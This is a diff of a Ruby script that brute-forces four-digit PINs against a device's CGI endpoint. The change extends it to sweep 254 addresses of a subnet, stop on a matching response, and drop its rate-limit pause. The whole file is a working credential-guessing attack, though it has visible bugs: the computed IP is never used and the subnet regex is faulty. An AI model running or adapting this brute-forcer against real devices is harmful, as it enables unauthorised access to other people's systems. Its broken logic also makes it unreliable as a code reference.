@@ -49,37 +49,44 @@ end
 address   = ARGV.pop
 errors    = Array.new
 responses = Array.new
-output    = sprintf('%s-logs.%s.%s.json', __FILE__, Time.now.to_i, $$)
+output    = sprintf('%s-logs-%s.%s.%s.json', __FILE__, address, Time.now.to_i, $$)
 
 if address.nil?
   puts sprintf('usage: %s <address>', __FILE__)
   exit 1
 end
 
-9999.downto(0) do |i|
-  # TODO we should prioritize 0000, 1234, etc
+1.upto(254) do |octet|
+base = $1 if address.match(/((?:\d{1,3}){3}\.)/)
+ip = sprintf('%s.%s', base, octet)
+  9999.downto(0) do |i|
+    # TODO we should prioritize 0000, 1234, etc
 
-  pin = sprintf('%04d', i)
+    pin = sprintf('%04d', i)
 
-  begin
-    url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', address)
+    begin
+      url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', address)
 
-    puts sprintf('trying pin[%s]', pin)
+      puts sprintf('trying pin[%s]', pin)
 
-    response = check_pin(url, pin)
+      response = check_pin(url, pin)
 
-    # TODO need to do some inspection on the responses to find the difference
-    responses << response
+      responses << response
+      if response.body.match(/1/)
+        puts sprintf('INFO: found the pin[%s]', pin)
+        break
+      end
 
-    # TODO need to do some handling on the rate limiting that is almost certain to follow, this is a bit blind
-    sleep 1 if (i % 100).eql?(0)
+      #sleep 1 if (i % 100).eql?(0)
 
-  rescue => e
-    puts sprintf('ERROR: something bad happened on pin[%s]: [%s:%s]', pin, e.class, e.message)
-    errors << { :exception => e, :pin => pin }
+    rescue => e
+      puts sprintf('ERROR: something bad happened on pin[%s]: [%s:%s]', pin, e.class, e.message)
+      errors << { :exception => e, :pin => pin }
+    end
+
   end
-
 end
+
 
 # marshalling the data, at least until we know what we're looking for
 begin
